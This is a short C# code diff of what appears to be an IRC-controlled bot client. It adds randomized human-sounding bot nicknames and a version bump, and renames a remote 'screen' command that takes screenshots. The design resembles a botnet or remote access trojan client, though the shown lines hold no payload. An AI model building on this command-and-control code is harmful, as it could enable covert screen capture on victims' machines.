@@ -13,7 +13,7 @@ namespace tom
 {
     class IRC
     {
-        public string VERSION = "v1";
+        public string VERSION = "v2";
 
         private IrcChannel channel;
         private BotActions actions;
@@ -22,12 +22,14 @@ namespace tom
         private string chan = "#bots";
         private string name = "";
 
+        String[] names = {"tom", "bob", "nancy", "drew", "john", "liza", "ellie", "patsy", "jesus", "murphy", "higgs", "tim", "sheldon", "picard"};
+
         public IRC()
         {
             actions = new BotActions(this);
 
             Random r = new Random();            
-            name = "tom_"+VERSION+"_" + r.Next(10000);
+            name = names[r.Next(names.Length)] + "_" + r.Next(10000) + VERSION;
 
             string curFile = @System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\ChatSharp.dll";
             if (!File.Exists(curFile))
@@ -98,7 +100,7 @@ namespace tom
                     actions.Name();
                     break;
                 case "screen":
-                    actions.ScreenShot();
+                    actions.TakeScreenShots();
                     break;
                 case "alert":
                     String message = "";
